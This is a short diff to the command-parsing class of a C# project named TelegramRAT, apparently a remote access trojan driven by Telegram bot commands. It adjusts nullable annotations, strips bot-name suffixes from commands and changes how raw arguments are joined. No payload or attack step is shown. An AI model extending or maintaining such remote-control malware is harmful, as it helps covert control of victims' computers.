@@ -14,10 +14,10 @@ namespace TelegramRAT
     {
         public string Command { get; set; }
 
-        public string? Description { get; set; } = null;
-        public string? Example { get; set; } = null;
+        public string Description { get; set; } = null;
+        public string Example { get; set; } = null;
 
-        public string[]? Groups { get; set; } = null;
+        public string[] Groups { get; set; } = null;
 
         public Action<BotCommandModel, Update> Execute { get; set; }
 
@@ -34,6 +34,9 @@ namespace TelegramRAT
                 var name = splits?.FirstOrDefault().ToLower();
                 var args = splits.Skip(1).Take(splits.Count()).ToArray();
                 List<string> finished = new List<string>();
+
+                if (name.Contains('@'))
+                    name = name.Substring(0, name.IndexOf('@'));
 
                 string fullargs = string.Join(" ", args);
                 bool concating = false;
@@ -82,7 +85,7 @@ namespace TelegramRAT
                 {
                     Command = name,
                     Args = finished.ToArray(),
-                    RawArgs = (args.Length != 0) ? text.Substring(name.Length + 1) : null
+                    RawArgs = string.Join(" ", args)
                 };
             }
             return null;
